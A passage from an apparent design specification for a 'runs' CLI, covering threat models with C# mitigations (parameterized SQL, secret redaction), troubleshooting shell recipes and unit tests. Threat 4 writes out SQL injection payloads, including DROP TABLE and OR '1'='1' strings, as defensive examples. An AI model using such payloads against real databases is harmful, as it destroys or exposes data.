- Require explicit `--no-redaction` flag with confirmation prompt

---

### Threat 4: SQL Injection in Run List Filters

**Risk:** If filter parameters (--task, --status, --user) are concatenated directly into SQL queries, attackers could inject SQL to read/modify database. Example: `--task "build'; DROP TABLE runs; --"` could destroy data.

**Attack Scenario:**
1. Attacker provides malicious task filter: `acode runs list --task "test' OR '1'='1"`
2. Application constructs query: `SELECT * FROM runs WHERE task='test' OR '1'='1'`
3. Condition `'1'='1'` is always true, bypassing filter
4. All runs returned, including sensitive internal runs
5. Attacker escalates to: `--task "x'; UPDATE runs SET status='failed'; --"`
6. All runs marked as failed, breaking CI/CD pipeline

**Mitigation (C# - Parameterized Queries with RunQueryBuilder):**

```csharp
namespace Acode.Infrastructure.Persistence;

public sealed class RunRepository : IRunRepository
{
    private readonly IDbConnection _db;

    public async Task<List<RunRecord>> ListAsync(RunListFilters filters)
    {
        // NEVER concatenate user input into SQL strings
        var query = new RunQueryBuilder()
            .Select("id", "task", "status", "exit_code", "started_at", "duration_ms")
            .From("runs")
            .ApplyFilters(filters) // Safe filter application
            .OrderBy(filters.SortBy, filters.SortOrder)
            .Limit(filters.Limit)
            .Offset(filters.Offset)
            .Build();

        // Execute with parameters (prevents SQL injection)
        return (await _db.QueryAsync<RunRecord>(query.Sql, query.Parameters)).ToList();
    }
}

public class RunQueryBuilder
{
    private readonly StringBuilder _sql = new();
    private readonly Dictionary<string, object> _parameters = new();
    private int _paramCounter = 0;

    public RunQueryBuilder Select(params string[] columns)
    {
        // Whitelist columns (no user input in column names)
        var allowedColumns = new HashSet<string>
        {
            "id", "task", "status", "exit_code", "started_at", "duration_ms", "user"
        };

        var safeColumns = columns.Where(c => allowedColumns.Contains(c)).ToArray();
        _sql.Append($"SELECT {string.Join(", ", safeColumns)} ");
        return this;
    }

    public RunQueryBuilder From(string table)
    {
        // Hardcoded table name (no user input)
        _sql.Append("FROM runs ");
        return this;
    }

    public RunQueryBuilder ApplyFilters(RunListFilters filters)
    {
        var whereClauses = new List<string>();

        // Filter: task (parameterized)
        if (!string.IsNullOrEmpty(filters.Task))
        {
            var paramName = $"@p{_paramCounter++}";
            whereClauses.Add($"task = {paramName}");
            _parameters[paramName] = filters.Task; // Safe - uses parameter binding
        }

        // Filter: status (enum validation + parameterized)
        if (filters.Status.HasValue)
        {
            var paramName = $"@p{_paramCounter++}";
            whereClauses.Add($"status = {paramName}");
            _parameters[paramName] = filters.Status.Value.ToString(); // Enum - safe
        }

        // Filter: user (parameterized)
        if (!string.IsNullOrEmpty(filters.User))
        {
            var paramName = $"@p{_paramCounter++}";
            whereClauses.Add($"user = {paramName}");
            _parameters[paramName] = filters.User;
        }

        // Filter: date range (parameterized)
        if (filters.StartedAfter.HasValue)
        {
            var paramName = $"@p{_paramCounter++}";
            whereClauses.Add($"started_at >= {paramName}");
            _parameters[paramName] = filters.StartedAfter.Value;
        }

        if (whereClauses.Any())
            _sql.Append($"WHERE {string.Join(" AND ", whereClauses)} ");

        return this;
    }

    public RunQueryBuilder OrderBy(string column, SortOrder order)
    {
        // Whitelist sort columns
        var allowedColumns = new HashSet<string> { "id", "started_at", "duration_ms", "task" };
        if (!allowedColumns.Contains(column))
            column = "started_at"; // Default

        var direction = order == SortOrder.Ascending ? "ASC" : "DESC";
        _sql.Append($"ORDER BY {column} {direction} ");
        return this;
    }

    public RunQueryBuilder Limit(int limit)
    {
        // Validate and cap limit
        if (limit < 1) limit = 50;
        if (limit > 1000) limit = 1000;

        var paramName = $"@p{_paramCounter++}";
        _sql.Append($"LIMIT {paramName} ");
        _parameters[paramName] = limit;
        return this;
    }

    public (string Sql, Dictionary<string, object> Parameters) Build()
    {
        return (_sql.ToString(), _parameters);
    }
}
```

**Prevention:**
- ALWAYS use parameterized queries (never string concatenation)
- Whitelist column names for SELECT and ORDER BY
- Validate enums before use in queries
- Cap LIMIT to reasonable maximum (prevent resource exhaustion)

---

### Threat 5: Redaction Bypass via Output Format Switching

**Risk:** Secrets redacted in terminal output (ANSI color codes, truncation) may be fully exposed when switching to JSON or YAML output formats. Developers unaware of this may inadvertently log or share sensitive data.

**Attack Scenario:**
1. Developer views run: `acode runs show run-prod-deploy` (terminal output)
2. Terminal output redacts environment: `API_KEY=***REDACTED***`
3. Developer pipes to JSON for scripting: `acode runs show run-prod-deploy --format json > run.json`
4. JSON contains full unredacted secrets: `"API_KEY": "sk-prod-abc123..."`
5. `run.json` committed to git, shared in Slack, or uploaded to issue tracker
6. Secrets exposed to entire team or public repository

**Mitigation (C# - FormatAwareRedactor):**

```csharp
namespace Acode.Application.Runs;

public sealed class RunShowCommand
{
    private readonly IRunRepository _repository;
    private readonly ISecretRedactor _redactor;

    public async Task<int> ExecuteAsync(string runId, OutputFormat format, bool noRedaction)
    {
        var run = await _repository.GetByIdAsync(runId);
        if (run == null)
        {
            Console.Error.WriteLine($"Run not found: {runId}");
            return 1;
        }

        // CRITICAL: Apply redaction BEFORE formatting (not after)
        var redactedRun = noRedaction ? run : _redactor.RedactSecrets(run);

        // Warn user if showing unredacted in non-terminal formats
        if (noRedaction && format != OutputFormat.Terminal)
        {
            Console.Error.WriteLine("⚠️  WARNING: --no-redaction with JSON/YAML output exposes secrets!");
            Console.Error.Write("Are you sure you want to continue? (yes/no): ");
            var confirmation = Console.ReadLine();
            if (confirmation?.ToLowerInvariant() != "yes")
            {
                Console.WriteLine("Cancelled.");
                return 0;
            }
        }

        // Format output
        var output = format switch
        {
            OutputFormat.Terminal => FormatForTerminal(redactedRun),
            OutputFormat.Json => JsonSerializer.Serialize(redactedRun, new JsonSerializerOptions { WriteIndented = true }),
            OutputFormat.Yaml => YamlSerializer.Serialize(redactedRun),
            _ => throw new ArgumentException($"Unsupported format: {format}")
        };

        Console.WriteLine(output);
        return 0;
    }

    private string FormatForTerminal(RunRecord run)
    {
        var sb = new StringBuilder();
        sb.AppendLine($"Run ID: {run.Id}");
        sb.AppendLine($"Task: {run.Task}");
        sb.AppendLine($"Status: {run.Status}");
        sb.AppendLine($"Exit Code: {run.ExitCode}");
        sb.AppendLine($"Duration: {run.DurationMs}ms");
        sb.AppendLine();
        sb.AppendLine("Environment:");
        foreach (var (key, value) in run.Environment)
        {
            // Redacted values already replaced, safe to display
            sb.AppendLine($"  {key}={value}");
        }
        return sb.ToString();
    }
}

public interface ISecretRedactor
{
    RunRecord RedactSecrets(RunRecord run);
}

public class SecretRedactor : ISecretRedactor
{
    private static readonly Regex[] SecretPatterns = new[]
    {
        new Regex(@"(?i)(api[_-]?key|password|secret|token|credential)[:=]\s*[^\s]{8,}", RegexOptions.Compiled),
        new Regex(@"sk-[a-zA-Z0-9]{48,}", RegexOptions.Compiled),
        new Regex(@"ghp_[a-zA-Z0-9]{36,}", RegexOptions.Compiled),
        new Regex(@"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----", RegexOptions.Compiled)
    };

    public RunRecord RedactSecrets(RunRecord run)
    {
        // Deep clone to avoid modifying original
        var redacted = run.Clone();

        // Redact environment variables
        redacted.Environment = redacted.Environment
            .ToDictionary(
                kvp => kvp.Key,
                kvp => RedactValue(kvp.Key, kvp.Value)
            );

        // Redact command arguments if present
        if (!string.IsNullOrEmpty(redacted.Command))
            redacted.Command = RedactCommandLine(redacted.Command);

        return redacted;
    }

    private string RedactValue(string key, string value)
    {
        // Redact by key name
        if (Regex.IsMatch(key, @"(?i)(key|password|secret|token|credential)"))
            return "***REDACTED***";

        // Redact by value pattern
        foreach (var pattern in SecretPatterns)
        {
            if (pattern.IsMatch(value))
                return "***REDACTED***";
        }

        return value;
    }

    private string RedactCommandLine(string command)
    {
        // Redact anything after --password, --token, etc.
        return Regex.Replace(
            command,
            @"(?i)(--?(?:password|token|key|secret)[\s=]+)([^\s]+)",
            "$1***REDACTED***"
        );
    }
}
```

**Prevention:**
- Apply redaction BEFORE formatting (not in formatter)
- Require explicit confirmation for `--no-redaction` with JSON/YAML
- Warn users about secret exposure risk in non-terminal formats
- Make redaction the default (opt-out, not opt-in)

---

## Best Practices

### Command Design

1. **Consistent subcommand structure** - `runs list`, `runs show`, `runs logs`, `runs diff`
2. **Sensible defaults** - Show recent runs, limit output, format for terminal
3. **Discoverability** - `--help` shows all options with examples
4. **Tab completion** - Support shell completion for run IDs

### Output Formatting

5. **JSON for automation** - `--json` outputs machine-readable format
6. **Table for humans** - Default tabular output with aligned columns
7. **Color coding** - Success green, failure red (when terminal supports)
8. **Truncate long values** - Show partial command with ellipsis

### Performance

9. **Query efficiently** - Use database indexes, limit result sets
10. **Stream large logs** - Don't load entire log into memory
11. **Cancel gracefully** - Ctrl-C stops output cleanly
12. **Progress indication** - Show progress for long operations

---

## Troubleshooting

### Issue 1: Run ID Not Found Despite Run Existing in Database

**Symptoms:**
- `acode runs show <run-id>` returns "Run not found: <run-id>"
- `acode runs list` shows the run in the list
- Error: "Run ID '<run-id>' does not exist in workspace"
- Artifacts visible in filesystem: `.acode/artifacts/<run-id>/` exists
- Database queries show run present

**Causes:**
1. Partial run ID provided, multiple matches exist (ambiguous ID)
2. Run ID format mismatch (hyphen vs underscore, case sensitivity)
3. Workspace database out of sync with active workspace
4. Run ID contains special characters not escaped in query
5. Database index corruption causing lookup failures
6. Whitespace or invisible characters in provided run ID
7. Run exists in different workspace than currently active

**Solutions:**

```bash
# Solution 1: Use full run ID instead of partial
# If you used: acode runs show abc123
# Error: "Multiple runs match 'abc123': run-abc123-build, run-abc123-test"

# Use full ID:
acode runs show run-abc123-build-20240115

# List all runs matching prefix:
acode runs list --id-prefix abc123

# Solution 2: Check exact run ID format in database
acode db query "SELECT id FROM runs WHERE id LIKE '%abc123%'"
# Example output: run-abc123-build-20240115

# Copy exact ID from output:
acode runs show run-abc123-build-20240115

# Solution 3: Verify active workspace
acode workspace current
# Output: workspace-name: my-project

# List all workspaces:
acode workspace list
# Output:
#   * my-project (active)
#     legacy-project
#     temp-workspace

# Switch if run is in different workspace:
acode workspace switch legacy-project
acode runs show <run-id>

# Solution 4: Check for whitespace in run ID
# If copy-pasted from terminal, may include trailing space
echo "<run-id>" | cat -A
# Shows: run-abc123$ ($ indicates newline)

# Trim whitespace:
run_id=$(echo "run-abc123" | tr -d '[:space:]')
acode runs show "$run_id"

# Solution 5: Rebuild run index from filesystem
acode runs reindex
# Scans .acode/artifacts/ and syncs database

# Output:
# Reindexing workspace...
# Found 145 run directories
# Database has 143 runs
# Adding 2 missing runs to database...
# Done.

# Retry query:
acode runs show <run-id>

# Solution 6: Query database directly to verify run exists
acode db query "SELECT id, task, status, started_at FROM runs WHERE id = '<run-id>'"
# If no results, run genuinely missing from DB

# If results returned but "runs show" fails, report bug:
acode debug run-lookup <run-id>

# Solution 7: Check for database corruption
acode db integrity-check
# Runs PRAGMA integrity_check on SQLite database

# If corrupted, restore from backup:
ls -lt .acode/backups/*.db | head -5
# Shows recent backups

cp .acode/backups/workspace-20240115.db .acode/workspace.db
# Warning: Loses runs created after backup date

# Solution 8: Use verbose mode to see detailed error
acode runs show <run-id> --verbose
# Shows full error stack trace and database query
```

---

### Issue 2: Permission Denied When Reading Log Files

**Symptoms:**
- `acode runs logs <run-id>` fails with "Permission denied"
- Error: "Cannot read file: .acode/artifacts/<run-id>/stdout.txt (EACCES)"
- `acode runs show` works fine (metadata accessible)
- File exists but content inaccessible
- Logs show: "Failed to open log file: permission error"

**Causes:**
1. Log file owned by different user (run created with sudo or different account)
2. File permissions too restrictive (e.g., 600 instead of 644)
3. Parent directory permissions block traversal (no execute permission)
4. SELinux or AppArmor policies blocking read access
5. File locked by another process (exclusive lock)
6. NFS/network filesystem permission issues
7. Antivirus software quarantined the file

**Solutions:**

```bash
# Solution 1: Check file ownership and permissions
ls -la .acode/artifacts/<run-id>/stdout.txt
# Example output:
# -rw------- 1 root root 4096 Jan 15 10:00 stdout.txt
# Problem: Owned by root, not current user

# Fix ownership:
sudo chown $USER:$USER .acode/artifacts/<run-id>/stdout.txt

# Fix permissions:
chmod 644 .acode/artifacts/<run-id>/stdout.txt

# Verify:
cat .acode/artifacts/<run-id>/stdout.txt
# Should now work

# Solution 2: Check parent directory permissions
ls -ld .acode/artifacts/<run-id>/
# Expected: drwxr-xr-x (755)

# If missing execute permission:
# drwxr--r-- (644) - WRONG, no execute
chmod 755 .acode/artifacts/<run-id>/

# Solution 3: Recursively fix all permissions in artifacts directory
find .acode/artifacts/ -type d -exec chmod 755 {} \;
find .acode/artifacts/ -type f -exec chmod 644 {} \;

# Then retry:
acode runs logs <run-id>

# Solution 4: Check for file locks
lsof .acode/artifacts/<run-id>/stdout.txt
# Example output:
# COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
# tail     1234 user    3r   REG  259,2     4096  123 stdout.txt

# If locked by another process, kill it (if safe):
kill 1234

# Or wait for process to finish:
while lsof .acode/artifacts/<run-id>/stdout.txt; do sleep 1; done
acode runs logs <run-id>

# Solution 5: Check SELinux context (RHEL/CentOS/Fedora)
ls -Z .acode/artifacts/<run-id>/stdout.txt
# Example: -rw-r--r--. user user unconfined_u:object_r:user_tmp_t:s0 stdout.txt

# If context wrong, restore:
sudo restorecon -R .acode/artifacts/

# Temporarily disable SELinux to test:
sudo setenforce 0
acode runs logs <run-id>
# If works, create SELinux policy for acode

# Re-enable:
sudo setenforce 1

# Solution 6: Check NFS mount options (if on network filesystem)
mount | grep .acode
# Look for "ro" (read-only) or missing exec permissions

# Remount with proper options:
sudo mount -o remount,rw,exec /path/to/mount

# Solution 7: Read with elevated privileges (LAST RESORT)
# Only if file legitimately requires elevated access:
sudo acode runs logs <run-id>

# Better: Fix ownership to avoid needing sudo:
sudo chown -R $USER:$USER .acode/

# Solution 8: Copy file to temp location with proper permissions
cp .acode/artifacts/<run-id>/stdout.txt /tmp/debug-stdout.txt
chmod 644 /tmp/debug-stdout.txt
cat /tmp/debug-stdout.txt
# Workaround to read content, but doesn't fix root cause
```

---

### Issue 3: Diff Output Shows Garbled Characters (Encoding Issues)

**Symptoms:**
- `acode runs diff <run1> <run2>` displays garbled text: `�����` or `\x00\x1F`
- Non-ASCII characters appear as question marks or boxes
- ANSI color codes visible as text: `^[[31mError^[[0m`
- Unicode emojis broken: `\uD83D\uDE00` instead of 😀
- Diff output unreadable in terminal

**Causes:**
1. Log files contain binary data (compressed, encrypted, or raw binary)
2. Mixed encodings in log files (UTF-8, Latin-1, Windows-1252)
3. Terminal doesn't support UTF-8 encoding
4. ANSI color codes embedded in logs (not interpreted by terminal)
5. Null bytes or control characters in log output
6. File incorrectly detected as text when it's binary
7. Diff tool doesn't handle non-UTF-8 encodings

**Solutions:**

```bash
# Solution 1: Check if file is binary
file .acode/artifacts/<run-id>/stdout.txt
# Expected: "stdout.txt: UTF-8 Unicode text"
# Problem: "stdout.txt: data" (binary)

# If binary, don't diff content:
acode runs diff <run1> <run2> --metadata-only
# Shows only metadata differences, skips artifact content

# Solution 2: Verify file encoding
file -i .acode/artifacts/<run-id>/stdout.txt
# Example output: "text/plain; charset=iso-8859-1"

# Convert to UTF-8:
iconv -f ISO-8859-1 -t UTF-8 .acode/artifacts/<run-id>/stdout.txt > /tmp/converted.txt
# View converted file to verify

# Permanently fix: Configure acode to force UTF-8:
acode config set runs.artifacts.force-utf8-encoding true

# Solution 3: Check terminal encoding
echo $LANG
# Expected: "en_US.UTF-8"

# If not UTF-8, set it:
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8

# Retry diff:
acode runs diff <run1> <run2>

# Solution 4: Strip ANSI color codes from logs before diffing
# If logs contain raw ANSI codes that aren't interpreted:

# Strip codes using sed:
sed 's/\x1b\[[0-9;]*m//g' .acode/artifacts/<run-id>/stdout.txt > /tmp/clean.txt

# Or use acode option:
acode runs diff <run1> <run2> --no-color --strip-ansi
# Removes ANSI codes before diff

# Solution 5: Detect and skip binary artifacts
acode runs diff <run1> <run2> --skip-binary
# Automatically skips files detected as binary

# Example output:
# Comparing runs:
#   Metadata: 3 differences
#   stdout.txt: SKIPPED (binary)
#   stderr.txt: 12 differences

# Solution 6: View raw hex dump for debugging
xxd .acode/artifacts/<run-id>/stdout.txt | head -20
# Shows first 20 lines of hex dump

# Identify problematic bytes:
# 00000000: 1f8b 0808 ... (gzip compressed data)
# 00000000: 504b 0304 ... (ZIP archive)

# If compressed, decompress first:
gunzip < .acode/artifacts/<run-id>/stdout.txt | acode runs logs --stdin

# Solution 7: Configure diff to handle encoding gracefully
acode config set runs.diff.encoding-handling "replace"
# Options: "strict" (fail on errors), "replace" (? for unknown chars), "ignore" (skip)

# Retry:
acode runs diff <run1> <run2>
# Unknown characters shown as "?"

# Solution 8: Use external diff tool with better encoding support
acode runs export <run1> --output /tmp/run1.zip
acode runs export <run2> --output /tmp/run2.zip

unzip /tmp/run1.zip -d /tmp/run1
unzip /tmp/run2.zip -d /tmp/run2

# Use diff with locale settings:
LC_ALL=C diff -ur /tmp/run1/ /tmp/run2/
# C locale treats files as bytes, no encoding issues
```

---

### Issue 4: "runs list" Query Timeout with Large Datasets

**Symptoms:**
- `acode runs list` hangs for 30+ seconds before returning results
- Error after 60s: "Query timeout exceeded"
- Database file `.acode/workspace.db` is 500MB+
- `top` shows `acode` process at 100% CPU during query
- Listing filtered runs still slow: `acode runs list --status failed` takes 20 seconds

**Causes:**
1. No database indexes on frequently queried columns (task, status, started_at)
2. Thousands of runs in database without pagination
3. Full table scan for each query (missing WHERE optimization)
4. Database fragmentation after many deletions
5. Inefficient query plan (multiple JOINs on large tables)
6. Slow disk I/O (HDD instead of SSD, network filesystem)
7. SQLite database not optimized (default settings)

**Solutions:**

```bash
# Solution 1: Check database size and run count
du -sh .acode/workspace.db
# Example: 523M .acode/workspace.db

acode db query "SELECT COUNT(*) FROM runs"
# Example: 15234 runs

# If >10,000 runs, consider archiving old runs:
acode runs archive --older-than 90d --output old-runs.zip
# Archives runs older than 90 days to ZIP file
# Removes from active database

# Solution 2: Verify database indexes exist
acode db query "SELECT name FROM sqlite_master WHERE type='index' AND tbl_name='runs'"
# Expected indexes:
#   idx_runs_started_at
#   idx_runs_status
#   idx_runs_task

# If missing, create indexes:
acode db migrate
# Runs schema migrations including index creation

# Or manually create:
acode db query "CREATE INDEX IF NOT EXISTS idx_runs_started_at ON runs(started_at DESC)"
acode db query "CREATE INDEX IF NOT EXISTS idx_runs_status ON runs(status)"
acode db query "CREATE INDEX IF NOT EXISTS idx_runs_task ON runs(task)"

# Verify query plan uses index:
acode db query "EXPLAIN QUERY PLAN SELECT * FROM runs WHERE status='failed' ORDER BY started_at DESC LIMIT 50"
# Should show "USING INDEX idx_runs_status"

# Solution 3: Always use pagination (limit results)
# Bad: acode runs list (returns ALL runs, slow)
# Good:
acode runs list --limit 50
# Returns only 50 most recent

# Page through results:
acode runs list --limit 50 --offset 0   # Page 1
acode runs list --limit 50 --offset 50  # Page 2
acode runs list --limit 50 --offset 100 # Page 3

# Solution 4: Optimize database (VACUUM)
# Rebuild database to remove fragmentation:
acode db vacuum
# Warning: May take several minutes, locks database during operation

# Example output:
# Vacuuming workspace database...
# Before: 523 MB
# After: 287 MB (45% reduction)
# Done.

# Retry query:
acode runs list --status failed
# Should be significantly faster

# Solution 5: Use covering indexes for common queries
# If frequently querying: task + status + started_at
acode db query "CREATE INDEX idx_runs_covering ON runs(task, status, started_at DESC)"
# Allows query to read only index, not table (faster)

# Solution 6: Increase SQLite cache size
acode config set database.cache-size-mb 100
# Allocates 100MB RAM for database cache (default: 2MB)

# Verify setting:
acode db query "PRAGMA cache_size"
# Output: -102400 (negative = kibibytes, 100MB)

# Solution 7: Move database to faster storage
# If on HDD:
mv .acode/workspace.db /tmp/workspace.db
ln -s /tmp/workspace.db .acode/workspace.db
# Links database to tmpfs (RAM disk, very fast)

# Warning: Data lost on reboot unless backed up

# Better: Move to SSD:
mv .acode/ /mnt/ssd/acode
ln -s /mnt/ssd/acode .acode

# Solution 8: Use query timeout with retry
# Set reasonable timeout:
acode config set database.query-timeout-sec 10
# Fails fast instead of hanging

# Add retry logic in scripts:
for i in {1..3}; do
  if acode runs list --status failed; then
    break
  fi
  echo "Retry $i..."
  sleep 2
done
```

---

### Issue 5: Log Streaming Stops Prematurely (Incomplete Output)

**Symptoms:**
- `acode runs logs <run-id>` displays only first 1000 lines, then exits
- Expected 50,000 line log, but only see first portion
- No error message, just stops mid-stream
- `Ctrl-C` not pressed, stream ends unexpectedly
- File exists and is complete (verified with `wc -l`)

**Causes:**
1. Default output limit configured (MAX_LOG_LINES setting)
2. Pipe buffer full, consuming process can't keep up
3. Terminal output paused (Ctrl-S accidentally pressed)
4. Streaming timeout configured (stops after N seconds)
5. Memory limit reached when buffering output
6. Broken pipe error (stdout closed by parent process)
7. File watcher limit reached (inotify watches exhausted on Linux)

**Solutions:**

```bash
# Solution 1: Check configured log line limit
acode config get runs.logs.max-lines
# Example: 1000 (default limit)

# Increase or remove limit:
acode config set runs.logs.max-lines 0
# 0 = unlimited

# Retry:
acode runs logs <run-id>
# Should now stream all lines

# Solution 2: Use --tail or --head for large logs
# If log is 50,000 lines, don't stream all:

# Last 100 lines:
acode runs logs <run-id> --tail 100

# First 100 lines:
acode runs logs <run-id> --head 100

# Lines 1000-2000:
acode runs logs <run-id> --offset 1000 --limit 1000

# Solution 3: Check if terminal output paused
# Press Ctrl-Q to resume (if Ctrl-S accidentally pressed)
# Ctrl-S pauses terminal output, Ctrl-Q resumes

# Test:
echo "test"
# If "test" appears, terminal not paused

# Solution 4: Stream to file instead of terminal
acode runs logs <run-id> > /tmp/full-log.txt
# Bypasses terminal buffer limits

# View file:
less /tmp/full-log.txt

# Solution 5: Increase streaming timeout
acode config get runs.logs.stream-timeout-sec
# Example: 30 (stops after 30 seconds of streaming)

# Increase for large logs:
acode config set runs.logs.stream-timeout-sec 300
# 5 minutes

# Or disable timeout:
acode config set runs.logs.stream-timeout-sec 0

# Solution 6: Check for broken pipe errors in verbose mode
acode runs logs <run-id> --verbose 2>&1 | tee /tmp/debug.log
# Captures both stdout and stderr

# Look for errors:
grep -i "broken pipe\|connection reset" /tmp/debug.log

# If broken pipe, consuming process died:
# Don't pipe to commands that exit early:
acode runs logs <run-id> | head -100  # BAD: head closes pipe after 100 lines
acode runs logs <run-id> --head 100   # GOOD: acode controls limit

# Solution 7: Paginate large logs
# Instead of streaming 50,000 lines:
acode runs logs <run-id> --page-size 1000
# Shows 1000 lines at a time, press Enter for next page

# Example interaction:
# [Lines 1-1000]
# --- Press Enter for next 1000 lines, Q to quit ---
# [User presses Enter]
# [Lines 1001-2000]
# ...

# Solution 8: Use follow mode for real-time streaming
# If run is still in progress:
acode runs logs <run-id> --follow
# Streams lines as they're written (like tail -f)

# Stops automatically when run completes

# For completed runs, just read full file:
cat .acode/artifacts/<run-id>/stdout.txt
```

---

## Testing Requirements

### Unit Tests (Complete C# Implementation)

```csharp
using Xunit;
using FluentAssertions;
using NSubstitute;
using Acode.Application.Runs.Queries;
using Acode.Domain.Runs;

namespace Acode.Application.Tests.Runs;

public class ListRunsQueryTests
{
    private readonly IRunRepository _repository;
    private readonly ListRunsQueryHandler _handler;

    public ListRunsQueryTests()
    {
        _repository = Substitute.For<IRunRepository>();
        _handler = new ListRunsQueryHandler(_repository);
    }

    [Fact]
    public async Task Handle_WithNoFilters_ReturnsAllRuns()
    {
        // Arrange
        var expectedRuns = new List<RunSummary>
        {
            new() { Id = new RunId("run-001"), StartTime = DateTimeOffset.Now, ExitCode = 0, CommandPreview = "build", Status = RunStatus.Success },
            new() { Id = new RunId("run-002"), StartTime = DateTimeOffset.Now, ExitCode = 1, CommandPreview = "test", Status = RunStatus.Failed }
        };
        _repository.ListAsync(Arg.Any<RunListFilters>()).Returns(expectedRuns);

        var query = new ListRunsQuery { Limit = 50, Offset = 0 };

        // Act
        var result = await _handler.Handle(query, CancellationToken.None);

        // Assert
        result.Should().HaveCount(2);
        result.Should().BeEquivalentTo(expectedRuns);
        await _repository.Received(1).ListAsync(Arg.Is<RunListFilters>(f => f.Limit == 50 && f.Offset == 0));
    }

    [Fact]
    public async Task Handle_WithStatusFilter_ReturnsFilteredRuns()
    {
        // Arrange
        var failedRun = new RunSummary { Id = new RunId("run-002"), StartTime = DateTimeOffset.Now, ExitCode = 1, CommandPreview = "test", Status = RunStatus.Failed };
        _repository.ListAsync(Arg.Any<RunListFilters>()).Returns(new List<RunSummary> { failedRun });

        var query = new ListRunsQuery { Status = RunStatus.Failed, Limit = 50 };

        // Act
        var result = await _handler.Handle(query, CancellationToken.None);

        // Assert
        result.Should().ContainSingle();
        result.First().Status.Should().Be(RunStatus.Failed);
        await _repository.Received(1).ListAsync(Arg.Is<RunListFilters>(f => f.Status == RunStatus.Failed));
    }

    [Fact]
    public async Task Handle_WithTaskFilter_ReturnsMatchingRuns()
    {
        // Arrange
        var buildRuns = new List<RunSummary>
        {
            new() { Id = new RunId("run-001"), StartTime = DateTimeOffset.Now, ExitCode = 0, CommandPreview = "build --release", Status = RunStatus.Success, Task = "build" },
            new() { Id = new RunId("run-003"), StartTime = DateTimeOffset.Now, ExitCode = 0, CommandPreview = "build --debug", Status = RunStatus.Success, Task = "build" }
        };
        _repository.ListAsync(Arg.Any<RunListFilters>()).Returns(buildRuns);

        var query = new ListRunsQuery { Task = "build", Limit = 50 };

        // Act
        var result = await _handler.Handle(query, CancellationToken.None);

        // Assert
        result.Should().HaveCount(2);
        result.Should().AllSatisfy(r => r.Task.Should().Be("build"));
    }

    [Theory]
    [InlineData("2024-01-15T10:00:00Z", true)]
    [InlineData("2024-01-14T10:00:00Z", false)]
    public async Task Handle_WithDateRangeFilter_ReturnsRunsInRange(string startedAfterStr, bool shouldIncludeRun)
    {
        // Arrange
        var startedAfter = DateTimeOffset.Parse(startedAfterStr);
        var testRun = new RunSummary
        {
            Id = new RunId("run-001"),
            StartTime = DateTimeOffset.Parse("2024-01-15T12:00:00Z"),
            ExitCode = 0,
            CommandPreview = "build",
            Status = RunStatus.Success
        };

        _repository.ListAsync(Arg.Any<RunListFilters>()).Returns(shouldIncludeRun ? new List<RunSummary> { testRun } : new List<RunSummary>());

        var query = new ListRunsQuery { StartedAfter = startedAfter, Limit = 50 };

        // Act
        var result = await _handler.Handle(query, CancellationToken.None);

        // Assert
        if (shouldIncludeRun)
            result.Should().ContainSingle().Which.Id.Value.Should().Be("run-001");
        else
            result.Should().BeEmpty();
    }

    [Fact]
    public async Task Handle_WithPagination_ReturnsCorrectPage()
    {
        // Arrange
        var page2Runs = new List<RunSummary>
        {
            new() { Id = new RunId("run-051"), StartTime = DateTimeOffset.Now, ExitCode = 0, CommandPreview = "test", Status = RunStatus.Success },
            new() { Id = new RunId("run-052"), StartTime = DateTimeOffset.Now, ExitCode = 0, CommandPreview = "test", Status = RunStatus.Success }
        };
        _repository.ListAsync(Arg.Any<RunListFilters>()).Returns(page2Runs);

        var query = new ListRunsQuery { Limit = 50, Offset = 50 }; // Page 2

        // Act
        var result = await _handler.Handle(query, CancellationToken.None);

        // Assert
        result.Should().HaveCount(2);
        await _repository.Received(1).ListAsync(Arg.Is<RunListFilters>(f => f.Offset == 50));
    }
}

public class GetRunQueryTests
{
    private readonly IRunRepository _repository;
    private readonly GetRunQueryHandler _handler;

    public GetRunQueryTests()
    {
        _repository = Substitute.For<IRunRepository>();
        _handler = new GetRunQueryHandler(_repository);
    }

    [Fact]
    public async Task Handle_WithFullRunId_ReturnsRunDetails()
    {
        // Arrange
        var runId = new RunId("run-abc123-build-20240115");
        var expectedRun = new RunDetails
        {
            Id = runId,
            TaskName = "build",
            StartTime = DateTimeOffset.Parse("2024-01-15T10:00:00Z"),
            EndTime = DateTimeOffset.Parse("2024-01-15T10:05:00Z"),
            Duration = TimeSpan.FromMinutes(5),
            ExitCode = 0,
            Status = RunStatus.Success,
            Command = "dotnet build --configuration Release",
            WorkingDirectory = "/workspace",
            OperatingMode = "LocalOnly",
            Environment = new Dictionary<string, string> { ["PATH"] = "/usr/bin" }
        };

        _repository.GetByIdAsync(runId).Returns(expectedRun);

        var query = new GetRunQuery { RunId = "run-abc123-build-20240115" };

        // Act
        var result = await _handler.Handle(query, CancellationToken.None);

        // Assert
        result.Should().NotBeNull();
        result.Id.Value.Should().Be("run-abc123-build-20240115");
        result.ExitCode.Should().Be(0);
        result.Duration.Should().Be(TimeSpan.FromMinutes(5));
    }

    [Fact]
    public async Task Handle_WithPartialRunId_ResolvesAndReturnsRun()
    {
        // Arrange
        var fullRunId = "run-abc123-build-20240115";
        var partialRunId = "abc123";

        _repository.FindByPartialIdAsync(partialRunId).Returns(new List<RunId> { new RunId(fullRunId) });
        _repository.GetByIdAsync(new RunId(fullRunId)).Returns(new RunDetails
        {
            Id = new RunId(fullRunId),
            TaskName = "build",
            StartTime = DateTimeOffset.Now,
            EndTime = DateTimeOffset.Now,
            Duration = TimeSpan.FromMinutes(5),
            ExitCode = 0,
            Status = RunStatus.Success,
            Command = "build",
            WorkingDirectory = "/workspace",
            OperatingMode = "LocalOnly"
        });

        var query = new GetRunQuery { RunId = partialRunId };

        // Act
        var result = await _handler.Handle(query, CancellationToken.None);

        // Assert
        result.Should().NotBeNull();
        result.Id.Value.Should().Be(fullRunId);
    }

    [Fact]
    public async Task Handle_WithAmbiguousPartialId_ThrowsException()
    {
        // Arrange
        var partialRunId = "abc";
        var matches = new List<RunId>
        {
            new RunId("run-abc123-build-20240115"),
            new RunId("run-abc456-test-20240115")
        };

        _repository.FindByPartialIdAsync(partialRunId).Returns(matches);

        var query = new GetRunQuery { RunId = partialRunId };

        // Act
        Func<Task> act = async () => await _handler.Handle(query, CancellationToken.None);

        // Assert
        await act.Should().ThrowAsync<AmbiguousRunIdException>()
            .WithMessage("*Multiple runs match 'abc'*");
    }

    [Fact]
